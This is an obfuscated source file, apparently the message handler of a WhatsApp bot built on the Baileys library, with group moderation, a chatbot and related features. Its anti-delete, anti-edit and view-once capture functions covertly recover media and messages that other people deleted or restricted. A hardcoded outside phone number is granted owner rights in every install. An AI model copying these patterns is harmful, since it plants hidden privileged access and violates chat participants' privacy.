require('./settings');
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  useMultiFileAuthState,
  makeWASocket,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const util = require("util");
const path = require("path");
const fs = require('fs');
const axios = require('axios');
const {
  performance
} = require('perf_hooks');
const process = require("process");
const moment = require('moment-timezone');
const lolcatjs = require("lolcatjs");
const os = require('os');
const more = String.fromCharCode(0x200e);
const readmore = more.repeat(0xfa1);
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar
} = require("./lib/converter");
const {
  smsg,
  formatDate,
  getTime,
  getGroupAdmins,
  formatp,
  await,
  sleep,
  isUrl,
  runtime,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  fetchJson,
  getBuffer,
  json,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  fetchBuffer,
  buffergif,
  GIFBufferToVideoBuffer,
  totalcase,
  bytesToSize,
  checkBandwidth
} = require("./lib/myfunc");
const delay = _0x178954 => new Promise(_0x447987 => setTimeout(_0x447987, _0x178954));
const errorLog = new Map();
const recordError = _0x521383 => {
  const _0x383100 = Date.now();
  errorLog.set(_0x521383, _0x383100);
  setTimeout(() => errorLog["delete"](_0x521383), 0xea60);
};
const shouldLogError = _0x26551a => {
  const _0x5ba1ff = Date.now();
  if (errorLog.has(_0x26551a)) {
    const _0x545d1e = errorLog.get(_0x26551a);
    if (_0x5ba1ff - _0x545d1e < 0xea60) {
      return false;
    }
  }
  return true;
};
const tylorkid1 = fs.readFileSync('./Media/Images/Xploader1.jpg');
const tylorkid2 = fs.readFileSync("./Media/Images/Xploader2.jpg");
const tylorkid3 = fs.readFileSync("./Media/Images/Xploader3.jpg");
const tylorkid4 = fs.readFileSync("./Media/Images/Xploader4.jpg");
const tylorkid5 = fs.readFileSync("./Media/Images/Xploader5.jpg");
const versions = require("./package.json").version;
const bad = JSON.parse(fs.readFileSync("./src/badwords.json"));
const {
  uploadMedia,
  handleMediaUpload
} = require("./lib/catbox");
global.db.data = JSON.parse(fs.readFileSync("./src/database.json"));
if (global.db.data) {
  global.db.data = {
    'chats': {},
    'settings': {},
    'blacklist': {
      'blacklisted_numbers': []
    },
    ...(global.db.data || {})
  };
}
module.exports = Cypher = async (_0x3ea047, _0x4421c3, _0x4a8009, _0x1b04a2) => {
  try {
    const {
      type: _0x306f00,
      quotedMsg: _0x2131ca,
      mentioned: _0x152c16,
      now: _0x575e36,
      fromMe: _0x131520
    } = _0x4421c3;
    var _0x5c7b02 = _0x4421c3.mtype === "conversation" ? _0x4421c3.message.conversation : _0x4421c3.mtype == "imageMessage" ? _0x4421c3.message.imageMessage.caption : _0x4421c3.mtype == "videoMessage" ? _0x4421c3.message.videoMessage.caption : _0x4421c3.mtype == "extendedTextMessage" ? _0x4421c3.message.extendedTextMessage.text : _0x4421c3.mtype == "buttonsResponseMessage" ? _0x4421c3.message.buttonsResponseMessage.selectedButtonId : _0x4421c3.mtype == 'listResponseMessage' ? _0x4421c3.message.listResponseMessage.singleSelectReply.selectedRowId : _0x4421c3.mtype == "templateButtonReplyMessage" ? _0x4421c3.message.templateButtonReplyMessage.selectedId : _0x4421c3.mtype === "messageContextInfo" ? _0x4421c3.message.buttonsResponseMessage?.["selectedButtonId"] || _0x4421c3.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x4421c3.text : '';
    var _0x3d3256 = typeof _0x4421c3.text == 'string' ? _0x4421c3.text : '';
    const _0x481c28 = global.prefixz;
    const _0x33dbeb = _0x5c7b02.startsWith(_0x481c28);
    const _0x49f23a = _0x33dbeb ? _0x5c7b02.slice(_0x481c28.length).trimStart() : '';
    const _0x22a65d = _0x33dbeb && _0x49f23a ? _0x49f23a.split(/\s+/).shift().toLowerCase() : '';
    const _0x2ac8fc = _0x4421c3.pushName || "No Name";
    const _0x277c48 = await _0x3ea047.decodeJid(_0x3ea047.user.id);
    const _0xd55e86 = [_0x277c48, "254754783972", global.ownernumber, ...global.sudo].map(_0x13c6f1 => _0x13c6f1.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(_0x4421c3.sender);
    const _0x333352 = _0x4421c3.key.remoteJid;
    const _0x4cc2f1 = _0x4421c3.isGroup ? await _0x3ea047.groupMetadata(_0x4421c3.chat)["catch"](_0x261178 => {
      console.error("Error fetching group metadata:", _0x261178);
      return null;
    }) : null;
    const _0x57a512 = _0x4421c3.isGroup && _0x4cc2f1 ? _0x4cc2f1.participants : [];
    const _0x6406e = _0x4421c3.isGroup ? await getGroupAdmins(_0x57a512) : [];
    const _0x33a1c9 = _0x4421c3.isGroup ? _0x6406e.includes(_0x277c48) : false;
    const _0xb5f0f7 = _0x4421c3.isGroup ? _0x6406e.includes(_0x4421c3.sender) : false;
    const _0x4a2305 = moment(Date.now()).tz('' + timezones).locale('en').format("dddd");
    const _0xa51ca8 = moment(Date.now()).tz('' + timezones).locale('en').format("HH:mm:ss z");
    if (_0xa51ca8 < '23:59:00') {
      var _0x28c494 = "Good Night 🌌";
    }
    if (_0xa51ca8 < "19:00:00") {
      var _0x28c494 = "Good Evening 🌃";
    }
    if (_0xa51ca8 < '18:00:00') {
      var _0x28c494 = "Good Evening 🌃";
    }
    if (_0xa51ca8 < "15:00:00") {
      var _0x28c494 = "Good Afternoon 🌅";
    }
    if (_0xa51ca8 < '11:00:00') {
      var _0x28c494 = "Good Morning 🌄";
    }
    if (_0xa51ca8 < '05:00:00') {
      var _0x28c494 = "Good Morning 🌄";
    }
    try {} catch (_0x3c56fc) {}
    try {
      if (_0x333352.endsWith("@g.us")) {
        let _0xdadf7 = global.db.data.chats[_0x333352];
        if (typeof _0xdadf7 !== "object") {
          global.db.data.chats[_0x333352] = {};
        }
        _0xdadf7 = global.db.data.chats[_0x333352];
        if (!('antibot' in _0xdadf7)) {
          _0xdadf7.antibot = false;
        }
        if (!("antilink" in _0xdadf7)) {
          _0xdadf7.antilink = false;
        }
        if (!('badword' in _0xdadf7)) {
          _0xdadf7.badword = false;
        }
        if (!("antilinkgc" in _0xdadf7)) {
          _0xdadf7.antilinkgc = false;
        }
        if (!("antilinkkick" in _0xdadf7)) {
          _0xdadf7.antilinkkick = false;
        }
        if (!("badwordkick" in _0xdadf7)) {
          _0xdadf7.badwordkick = false;
        }
        if (!("antilinkgckick" in _0xdadf7)) {
          _0xdadf7.antilinkgckick = false;
        }
      }
      let _0x3b64ca = global.db.data.settings[_0x277c48];
      if (typeof _0x3b64ca !== "object") {
        global.db.data.settings[_0x277c48] = {};
      }
      _0x3b64ca = global.db.data.settings[_0x277c48];
      if (!('autobio' in _0x3b64ca)) {
        _0x3b64ca.autobio = false;
      }
      if (!("autorecordtype" in _0x3b64ca)) {
        _0x3b64ca.autorecordtype = false;
      }
      if (!('autorecord' in _0x3b64ca)) {
        _0x3b64ca.autorecord = false;
      }
      if (!("autotype" in _0x3b64ca)) {
        _0x3b64ca.autotype = false;
      }
      if (!("antiviewonce" in _0x3b64ca)) {
        _0x3b64ca.antiviewonce = false;
      }
      if (!("autoread" in _0x3b64ca)) {
        _0x3b64ca.autoread = false;
      }
      let _0x3b5588 = global.db.data.blacklist;
      if (!_0x3b5588 || typeof _0x3b5588 !== "object") {
        global.db.data.blacklist = {
          'blacklisted_numbers': []
        };
      }
    } catch (_0x548e71) {
      console.error("Error initializing database:", _0x548e71);
    }
    if (_0x4421c3.message) {
      lolcatjs.fromString("┏━━━━━━━━━━━━━『 CYPHER-X 』━━━━━━━━━━━━━─");
      lolcatjs.fromString("» Sent Time: " + _0x4a2305 + ", " + _0xa51ca8);
      lolcatjs.fromString("» Message Type: " + _0x4421c3.mtype);
      lolcatjs.fromString("» Sender Name: " + (_0x2ac8fc || 'N/A'));
      lolcatjs.fromString("» Chat ID: " + _0x4421c3.chat.split('@')[0x0]);
      lolcatjs.fromString("» Message: " + (_0x3d3256 || 'N/A'));
      lolcatjs.fromString("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n");
    }
    if (db.data.settings[_0x277c48].autobio) {
      let _0x163607 = moment(Date.now()).tz('' + timezones).locale('en').format('dddd');
      let _0x364bda = moment(Date.now()).tz('' + timezones).locale('en').format("HH:mm z");
      let _0xc32296 = moment(Date.now()).tz('' + timezones).format("DD/MM/YYYY");
      _0x3ea047.updateProfileStatus(_0x364bda + ", " + _0x163607 + "; " + _0xc32296 + ":- " + botname)["catch"](_0x236d62 => _0x236d62);
    }
    if (db.data.settings[_0x277c48].autorecordtype) {
      if (_0x4421c3.message) {
        let _0x1488f1 = ['composing', "recording"];
        XpBotmix2 = _0x1488f1[Math.floor(_0x1488f1.length * Math.random())];
        _0x3ea047.sendPresenceUpdate(XpBotmix2, _0x333352);
      }
    }
    if (db.data.settings[_0x277c48].autorecord) {
      if (_0x4421c3.message) {
        let _0x51de8c = ["recording"];
        XpBotmix2 = _0x51de8c[Math.floor(_0x51de8c.length * Math.random())];
        _0x3ea047.sendPresenceUpdate(XpBotmix2, _0x333352);
      }
    }
    if (db.data.settings[_0x277c48].autotype) {
      if (_0x4421c3.message) {
        let _0x57d309 = ["composing"];
        _0x3ea047.sendPresenceUpdate(_0x57d309, _0x333352);
      }
    }
    if (_0x333352.endsWith('@g.us') && db.data.chats[_0x4421c3.chat].antibot) {
      if (_0x4421c3.isBaileys && (!_0xb5f0f7 || !_0xd55e86 || _0x33a1c9)) {
        _0x4421c3.reply("*BOT DETECTED*\n\nGo away!");
        await _0x3ea047.groupParticipantsUpdate(_0x4421c3.chat, [_0x4421c3.sender], 'remove');
      }
    }
    if (_0x333352.endsWith("@g.us") && db.data.chats[_0x4421c3.chat].antilinkgc) {
      const _0x2964e2 = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i;
      if (_0x4421c3.message && _0x2964e2.test(_0x3d3256)) {
        if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
          return;
        }
        await _0x3ea047.sendMessage(_0x4421c3.chat, {
          'delete': {
            'remoteJid': _0x4421c3.chat,
            'fromMe': false,
            'id': _0x4421c3.key.id,
            'participant': _0x4421c3.key.participant
          }
        });
      }
    }
    if (_0x333352.endsWith("@g.us") && db.data.chats[_0x4421c3.chat].antilinkgckick) {
      const _0x4cf6bc = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i;
      if (_0x4421c3.message && _0x4cf6bc.test(_0x3d3256)) {
        if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
          return;
        }
        {
          if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
            return;
          }
          await _0x3ea047.sendMessage(_0x4421c3.chat, {
            'delete': {
              'remoteJid': _0x4421c3.chat,
              'fromMe': false,
              'id': _0x4421c3.key.id,
              'participant': _0x4421c3.key.participant
            }
          });
          _0x3ea047.sendMessage(_0x333352, {
            'text': "GROUP LINK DETECTED\n\n@" + _0x4421c3.sender.split('@')[0x0] + " *Beware, group links are not allowed in this group!*",
            'contextInfo': {
              'mentionedJid': [_0x4421c3.sender]
            }
          }, {
            'quoted': _0x4421c3
          });
          await _0x3ea047.groupParticipantsUpdate(_0x4421c3.chat, [_0x4421c3.sender], "remove");
        }
      }
    }
    if (_0x333352.endsWith('@g.us') && db.data.chats[_0x4421c3.chat].antilink) {
      const _0x1867b6 = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;
      const _0x9dd390 = _0x4421c3.message?.["conversation"] || _0x4421c3.message?.['extendedTextMessage']?.["text"] || _0x4421c3.message?.["imageMessage"]?.["caption"] || _0x4421c3.message?.["videoMessage"]?.["caption"] || _0x4421c3.message?.["pollCreationMessageV3"]?.['name'] || _0x4421c3.message?.["protocolMessage"]?.["editedMessage"]?.['conversation'] || _0x4421c3.message?.["protocolMessage"]?.['editedMessage']?.["extendedTextMessage"]?.['text'] || _0x4421c3.message?.["protocolMessage"]?.["editedMessage"]?.['imageMessage']?.['caption'] || _0x4421c3.message?.["protocolMessage"]?.['editedMessage']?.['videoMessage']?.["caption"] || _0x4421c3.message?.['protocolMessage']?.["editedMessage"] || pollMessageData;
      if (_0x9dd390 && _0x1867b6.test(_0x9dd390)) {
        if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
          return;
        }
        await _0x3ea047.sendMessage(_0x4421c3.chat, {
          'delete': {
            'remoteJid': _0x4421c3.chat,
            'fromMe': false,
            'id': _0x4421c3.key.id,
            'participant': _0x4421c3.key.participant
          }
        });
      }
    }
    if (_0x333352.endsWith("@g.us") && db.data.chats[_0x4421c3.chat].antilinkkick) {
      const _0x3ada91 = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;
      if (_0x4421c3.message && _0x3ada91.test(_0x3d3256)) {
        if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
          return;
        }
        await _0x3ea047.sendMessage(_0x4421c3.chat, {
          'delete': {
            'remoteJid': _0x4421c3.chat,
            'fromMe': false,
            'id': _0x4421c3.key.id,
            'participant': _0x4421c3.key.participant
          }
        });
        await _0x3ea047.sendMessage(_0x333352, {
          'text': "LINK DETECTED\n\n@" + _0x4421c3.sender.split('@')[0x0] + " *Beware, links are not allowed in this group!*",
          'contextInfo': {
            'mentionedJid': [_0x4421c3.sender]
          }
        }, {
          'quoted': _0x4421c3
        });
        await _0x3ea047.groupParticipantsUpdate(_0x4421c3.chat, [_0x4421c3.sender], "remove");
      }
    }
    if (_0x333352.endsWith('@g.us') && db.data.chats[_0x4421c3.chat].badword) {
      for (let _0x574dfc of bad) {
        let _0x55a297 = new RegExp("\\b" + _0x574dfc + "\\b", 'i');
        if (_0x55a297.test(_0x3d3256)) {
          if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
            return;
          }
          await _0x3ea047.sendMessage(_0x4421c3.chat, {
            'delete': {
              'remoteJid': _0x4421c3.chat,
              'fromMe': false,
              'id': _0x4421c3.key.id,
              'participant': _0x4421c3.key.participant
            }
          });
          await _0x3ea047.sendMessage(_0x333352, {
            'text': "BAD WORD DETECTED\n\n@" + _0x4421c3.sender.split('@')[0x0] + " *Beware, using bad words is prohibited in this group!*",
            'contextInfo': {
              'mentionedJid': [_0x4421c3.sender]
            }
          }, {
            'quoted': _0x4421c3
          });
          break;
        }
      }
    }
    if (_0x333352.endsWith("@g.us") && db.data.chats[_0x4421c3.chat].badwordkick) {
      for (let _0x3765ab of bad) {
        let _0x1e9db8 = new RegExp("\\b" + _0x3765ab + "\\b", 'i');
        if (_0x1e9db8.test(_0x3d3256)) {
          if (_0xb5f0f7 || _0xd55e86 || !_0x33a1c9) {
            return;
          }
          await _0x3ea047.sendMessage(_0x4421c3.chat, {
            'delete': {
              'remoteJid': _0x4421c3.chat,
              'fromMe': false,
              'id': _0x4421c3.key.id,
              'participant': _0x4421c3.key.participant
            }
          });
          await _0x3ea047.sendMessage(_0x333352, {
            'text': "BAD WORD DETECTED\n\n@" + _0x4421c3.sender.split('@')[0x0] + " *You have been removed for using prohibited language!*",
            'contextInfo': {
              'mentionedJid': [_0x4421c3.sender]
            }
          }, {
            'quoted': _0x4421c3
          });
          await _0x3ea047.groupParticipantsUpdate(_0x4421c3.chat, [_0x4421c3.sender], 'remove');
          break;
        }
      }
    }
    function _0x44c9fc() {
      if (fs.existsSync("./src/store.json")) {
        return JSON.parse(fs.readFileSync("./src/store.json"));
      }
      return {};
    }
    if (global.antidelete === "private" && _0x4421c3.message?.['protocolMessage']?.["type"] === 0x0 && _0x4421c3.message?.["protocolMessage"]?.["key"]) {
      try {
        let _0x2e4080 = _0x4421c3.message.protocolMessage.key.id;
        let _0x3958bf = _0x4421c3.chat;
        let _0x362642 = _0x4421c3.sender;
        let _0x2796c5 = _0x44c9fc();
        let _0x3dd344 = _0x2796c5[_0x3958bf]?.[_0x2e4080];
        if (!_0x3dd344) {
          console.log("⚠️ Deleted message not found in store.json.");
          return;
        }
        let _0x24f0b6 = _0x3dd344.sender;
        let _0x5b7388 = _0x3958bf.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
        let _0x54c619 = moment(_0x3dd344.timestamp * 0x3e8).tz('' + timezones).locale('en').format("HH:mm z");
        let _0x21ffb4 = moment(_0x3dd344.timestamp * 0x3e8).tz('' + timezones).format("DD/MM/YYYY");
        let _0x13b1b7 = "🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x5b7388 + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x24f0b6.split('@')[0x0] + " \n𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: " + _0x54c619 + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x21ffb4 + "\n𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @" + _0x362642.split('@')[0x0] + "\n\n𝙼𝙴𝚂𝚂𝙰𝙶𝙴: " + _0x3dd344.text;
        let _0x389df3 = {
          'key': {
            'remoteJid': _0x3958bf,
            'fromMe': _0x24f0b6 === _0x3ea047.user.id,
            'id': _0x2e4080,
            'participant': _0x24f0b6
          },
          'message': {
            'conversation': _0x3dd344.text
          }
        };
        await _0x3ea047.sendMessage(_0x3ea047.user.id, {
          'text': _0x13b1b7,
          'mentions': [_0x24f0b6, _0x362642]
        }, {
          'quoted': _0x389df3
        });
      } catch (_0x15bf90) {
        console.error("❌ Error processing deleted message:", _0x15bf90);
      }
    } else {
      if (global.antidelete === "chat" && _0x4421c3.message?.["protocolMessage"]?.["type"] === 0x0 && _0x4421c3.message?.["protocolMessage"]?.["key"]) {
        try {
          let _0x491be3 = _0x4421c3.message.protocolMessage.key.id;
          let _0x5f228c = _0x4421c3.chat;
          let _0x8c848 = _0x4421c3.sender;
          let _0x1ef4d8 = _0x44c9fc();
          let _0x115baa = _0x1ef4d8[_0x5f228c]?.[_0x491be3];
          if (!_0x115baa) {
            console.log("⚠️ Deleted message not found in store.json.");
            return;
          }
          let _0x3445fb = _0x115baa.sender;
          let _0x469d90 = _0x5f228c.endsWith('@g.us') ? "(Group Chat)" : "(Private Chat)";
          let _0x767766 = moment(_0x115baa.timestamp * 0x3e8).tz('' + timezones).locale('en').format("HH:mm z");
          let _0x501ebb = moment(_0x115baa.timestamp * 0x3e8).tz('' + timezones).format("DD/MM/YYYY");
          let _0x5ded7e = "🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x469d90 + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x3445fb.split('@')[0x0] + " \n𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: " + _0x767766 + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x501ebb + "\n𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @" + _0x8c848.split('@')[0x0] + "\n\n𝙼𝙴𝚂𝚂𝙰𝙶𝙴: " + _0x115baa.text;
          let _0x137ed3 = {
            'key': {
              'remoteJid': _0x5f228c,
              'fromMe': _0x3445fb === _0x3ea047.user.id,
              'id': _0x491be3,
              'participant': _0x3445fb
            },
            'message': {
              'conversation': _0x115baa.text
            }
          };
          await _0x3ea047.sendMessage(_0x4421c3.chat, {
            'text': _0x5ded7e,
            'mentions': [_0x3445fb, _0x8c848]
          }, {
            'quoted': _0x137ed3
          });
        } catch (_0x4ba5fa) {
          console.error("❌ Error processing deleted message:", _0x4ba5fa);
        }
      }
    }
    if (global.antiedit === "private" && (_0x4421c3.message?.["protocolMessage"]?.["editedMessage"]?.["conversation"] || _0x4421c3.message?.["protocolMessage"]?.["editedMessage"]?.["extendedTextMessage"]?.["text"])) {
      try {
        let _0xd2e2d7 = _0x4421c3.message.protocolMessage.key.id;
        let _0x1373d6 = _0x4421c3.chat;
        let _0x43dc92 = _0x4421c3.sender;
        let _0x4f6c2e = _0x44c9fc();
        let _0x454f92 = _0x4f6c2e[_0x1373d6]?.[_0xd2e2d7];
        if (!_0x454f92) {
          console.log("⚠️ Original message not found in store.json.");
          return;
        }
        let _0x44c6ac = _0x454f92.sender;
        let _0x17f12a = _0x1373d6.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
        let _0x33712d = moment(_0x454f92.timestamp * 0x3e8).tz('' + timezones).locale('en').format("HH:mm z");
        let _0x59946a = moment(_0x454f92.timestamp * 0x3e8).tz('' + timezones).format("DD/MM/YYYY");
        let _0x1f4976 = "🚨 *𝙴𝙳𝙸𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x17f12a + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x44c6ac.split('@')[0x0] + " \n𝚂𝙴𝙽𝚃 𝙾𝙽: " + _0x33712d + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x59946a + "\n𝙴𝙳𝙸𝚃𝙴𝙳 𝙱𝚈: @" + _0x43dc92.split('@')[0x0] + "\n\n𝙾𝚁𝙸𝙶𝙸𝙽𝙰𝙻 𝙼𝚂𝙶: " + _0x454f92.text + "\n\n𝙴𝙳𝙸𝚃𝙴𝙳 𝚃𝙾: " + (_0x4421c3.message.protocolMessage?.["editedMessage"]?.['conversation'] || _0x4421c3.message.protocolMessage?.["editedMessage"]?.["extendedTextMessage"]?.['text']);
        let _0x131a1d = {
          'key': {
            'remoteJid': _0x1373d6,
            'fromMe': _0x44c6ac === _0x3ea047.user.id,
            'id': _0xd2e2d7,
            'participant': _0x44c6ac
          },
          'message': {
            'conversation': _0x454f92.text
          }
        };
        await _0x3ea047.sendMessage(_0x3ea047.user.id, {
          'text': _0x1f4976,
          'mentions': [_0x44c6ac, _0x43dc92]
        }, {
          'quoted': _0x131a1d
        });
      } catch (_0x4fdb54) {
        console.error("❌ Error processing edited message:", _0x4fdb54);
      }
    } else {
      if (global.antiedit === "chat" && (_0x4421c3.message?.["protocolMessage"]?.["editedMessage"]?.['conversation'] || _0x4421c3.message?.["protocolMessage"]?.["editedMessage"]?.["extendedTextMessage"]?.["text"])) {
        try {
          let _0x5571cf = _0x4421c3.message.protocolMessage.key.id;
          let _0x6e4ecf = _0x4421c3.chat;
          let _0x1e69fb = _0x4421c3.sender;
          let _0x4c6b64 = _0x44c9fc();
          let _0x570b3f = _0x4c6b64[_0x6e4ecf]?.[_0x5571cf];
          if (!_0x570b3f) {
            console.log("⚠️ Original message not found in store.json.");
            return;
          }
          let _0x392345 = _0x570b3f.sender;
          let _0x526834 = _0x6e4ecf.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
          let _0x154da3 = moment(_0x570b3f.timestamp * 0x3e8).tz('' + timezones).locale('en').format("HH:mm z");
          let _0xe1ecf9 = moment(_0x570b3f.timestamp * 0x3e8).tz('' + timezones).format("DD/MM/YYYY");
          let _0x4d77fa = "🚨 *𝙴𝙳𝙸𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x526834 + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x392345.split('@')[0x0] + " \n𝚂𝙴𝙽𝚃 𝙾𝙽: " + _0x154da3 + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0xe1ecf9 + "\n𝙴𝙳𝙸𝚃𝙴𝙳 𝙱𝚈: @" + _0x1e69fb.split('@')[0x0] + "\n\n𝙾𝚁𝙸𝙶𝙸𝙽𝙰𝙻 𝙼𝚂𝙶: " + _0x570b3f.text + "\n\n𝙴𝙳𝙸𝚃𝙴𝙳 𝚃𝙾: " + (_0x4421c3.message.protocolMessage?.["editedMessage"]?.["conversation"] || _0x4421c3.message.protocolMessage?.['editedMessage']?.['extendedTextMessage']?.["text"]);
          let _0x20e627 = {
            'key': {
              'remoteJid': _0x6e4ecf,
              'fromMe': _0x392345 === _0x3ea047.user.id,
              'id': _0x5571cf,
              'participant': _0x392345
            },
            'message': {
              'conversation': _0x570b3f.text
            }
          };
          await _0x3ea047.sendMessage(_0x4421c3.chat, {
            'text': _0x4d77fa,
            'mentions': [_0x392345, _0x1e69fb]
          }, {
            'quoted': _0x20e627
          });
        } catch (_0x30a74d) {
          console.error("❌ Error processing edited message:", _0x30a74d);
        }
      }
    }
    if (global.alwaysonline === "false") {
      if (_0x4421c3.message) {
        try {
          await _0x3ea047.sendPresenceUpdate("unavailable", _0x333352);
          await delay(0x3e8);
        } catch (_0xe7647d) {
          console.error("Error sending unavailable presence update:", _0xe7647d);
        }
      }
    } else {
      if (global.alwaysonline === "true") {
        if (_0x4421c3.message) {
          try {
            await _0x3ea047.sendPresenceUpdate("available", _0x333352);
            await delay(0x3e8);
          } catch (_0x2c22c5) {
            console.error("Error sending available presence update:", _0x2c22c5);
          }
        }
      }
    }
    if (global.autoread === "true") {
      _0x3ea047.readMessages([_0x4421c3.key]);
    }
    if (_0x4421c3.quoted && (_0x4421c3.quoted.viewOnce || _0x4421c3.msg?.['contextInfo']?.["quotedMessage"]) && (_0x4421c3.message?.["conversation"] || _0x4421c3.message?.["extendedTextMessage"]) && _0xd55e86 && ['🌚', '😂', '🥲', '🤔', '🤭', '🍆', '🥵', '🫂', '😳'].some(_0x21b14f => _0x4421c3.body.startsWith(_0x21b14f))) {
      try {
        let _0x14da61 = _0x4421c3.msg?.["contextInfo"]?.["quotedMessage"];
        if (!_0x14da61) {
          return console.log("Quoted message not found.");
        }
        let _0x1dd03b = Object.keys(_0x14da61)[0x0];
        if (!_0x1dd03b || !/image|video/.test(_0x1dd03b)) {
          console.log("*Invalid media type!*");
          return;
        }
        const _0x328471 = await downloadContentFromMessage(_0x14da61[_0x1dd03b], _0x1dd03b === "imageMessage" ? 'image' : "video");
        const _0x49b904 = [];
        for await (const _0x1e3860 of _0x328471) {
          _0x49b904.push(_0x1e3860);
        }
        const _0x2fe629 = Buffer.concat(_0x49b904);
        await _0x3ea047.sendMessage(_0x3ea047.user.id, _0x1dd03b === "videoMessage" ? {
          'video': _0x2fe629,
          'caption': "*᙭ᑭᒪOᗩᗪᗴᖇ ᗷOT*"
        } : {
          'image': _0x2fe629,
          'caption': "*᙭ᑭᒪOᗩᗪᗴᖇ ᗷOT*"
        }, {
          'quoted': _0x4421c3
        });
      } catch (_0x4e2fd7) {
        console.error("Error processing media:", _0x4e2fd7);
      }
    } else {
      if (_0x4421c3.message && _0x4421c3.message.extendedTextMessage?.["contextInfo"]?.['quotedMessage'] && !_0x22a65d && _0xd55e86 && _0x4421c3.quoted.chat === 'status@broadcast') {
        try {
          await _0x4421c3.quoted.copyNForward(_0x3ea047.user.id, true);
          console.log("Status forwarded successfully!");
        } catch (_0xb8eaaa) {
          console.error("Error forwarding status:", _0xb8eaaa);
        }
      }
    }
    if (global.chatbot && global.chatbot === 'true' && (_0x4421c3.message.extendedTextMessage?.["text"] || _0x4421c3.message.conversation) && !_0xd55e86 && !_0x4421c3.isGroup && !_0x22a65d) {
      try {
        const _0x331d8c = _0x4421c3.sender;
        const _0x19d208 = _0x4421c3.message.extendedTextMessage?.['text'] || _0x4421c3.message.conversation || '';
        if (!_0x19d208.trim()) {
          return;
        }
        await _0x3ea047.sendPresenceUpdate("composing", _0x4421c3.chat);
        const _0x4a8589 = async () => {
          const _0x241e04 = {
            'q': _0x19d208.trim(),
            'userId': _0x331d8c
          };
          return axios.get("https://bk9.fun/ai/GPT4o", {
            'params': _0x241e04
          });
        };
        const _0x2ce4f3 = async () => {
          const _0x2a054c = {
            'q': _0x19d208.trim(),
            'userId': _0x331d8c
          };
          return axios.get("https://bk9.fun/ai/Llama3", {
            'params': _0x2a054c
          });
        };
        try {
          const _0x323070 = await _0x2ce4f3();
          const _0x7728d3 = _0x323070.data?.["BK9"];
          if (_0x7728d3) {
            await _0x3ea047.sendMessage(_0x4421c3.chat, {
              'text': '' + _0x7728d3
            }, {
              'quoted': _0x4421c3
            });
          }
        } catch (_0x346105) {
          console.error("Primary API request failed:", _0x346105);
          try {
            const _0xa78846 = await _0x4a8589();
            const _0x154246 = _0xa78846.data?.["BK9"];
            if (_0x154246) {
              await _0x3ea047.sendMessage(_0x4421c3.chat, {
                'text': '' + _0x154246
              }, {
                'quoted': _0x4421c3
              });
            }
          } catch (_0x8389e9) {
            console.error("Fallback API request failed:", _0x8389e9);
          }
        }
      } catch (_0xa6f837) {
        console.error("Error processing chatbot request:", _0xa6f837);
      }
    }
    function _0x7f09ab() {
      if (!global.db.data.blacklist) {
        global.db.data.blacklist = {
          'blacklisted_numbers': []
        };
      }
      return global.db.data.blacklist;
    }
    const _0x5c954b = _0x4421c3.chat;
    const _0x57b4c8 = _0x4421c3.key.remoteJid;
    const _0x3c4231 = _0x7f09ab();
    if ((_0x3c4231.blacklisted_numbers.includes(_0x57b4c8) || _0x3c4231.blacklisted_numbers.includes(_0x5c954b)) && _0x57b4c8 !== _0x277c48 && !_0x4421c3.key.fromMe) {
      return;
    }
    if (["120363321302359713@g.us", "120363381188104117@g.us"].includes(_0x4421c3.chat)) {
